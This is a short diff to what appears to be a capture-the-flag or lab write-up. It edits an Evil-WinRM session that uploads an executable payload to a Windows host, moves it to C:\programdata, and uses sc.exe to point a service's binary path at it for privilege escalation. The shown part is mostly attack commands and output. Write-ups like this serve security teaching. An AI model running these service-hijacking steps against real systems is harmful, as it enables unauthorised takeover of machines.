@@ -933,12 +933,14 @@ Info: Uploading /home/kali/hsm/CTOS/http.x64.exe to C:\Users\l_conrad\Documents\
 Data: 120148 bytes of 120148 bytes copied
                                         
 Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\l_conrad\Documents> mv http.x64.exe C:\programdata
 ```
 
 Ill now upload the payload
 
 ```python
-*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\Users\l_conrad\Documents\http.x64.exe"
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\programdata\http.x64.exe"
 [SC] ChangeServiceConfig SUCCESS
 ```
 
